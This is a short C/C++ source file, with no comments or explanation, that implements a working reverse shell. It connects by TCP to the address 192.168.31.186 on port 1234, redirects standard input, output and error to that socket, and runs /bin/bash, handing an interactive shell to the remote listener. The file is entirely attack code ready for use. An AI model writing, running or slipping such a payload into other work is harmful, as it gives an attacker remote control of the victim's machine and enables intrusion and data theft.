#include<stdio.h>
#include<stdlib.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<unistd.h>
#include<bits/stdc++.h>
#include<arpa/inet.h>

using namespace std;

int main()
{
 int sajib;
 int port=1234;
 struct sockaddr_in arobi;
 sajib=socket(AF_INET,SOCK_STREAM,0);
 arobi.sin_family=AF_INET;
 arobi.sin_port=htons(port);
 arobi.sin_addr.s_addr=inet_addr("192.168.31.186");
 connect(sajib,(struct sockaddr * )&arobi,sizeof(arobi));
 dup2(sajib,0);
 dup2(sajib,1);
 dup2(sajib,2);
 //char * const argv[]={"bin/bash",NULL};
 execve("/bin/bash",NULL,NULL);

 return 0;	
}
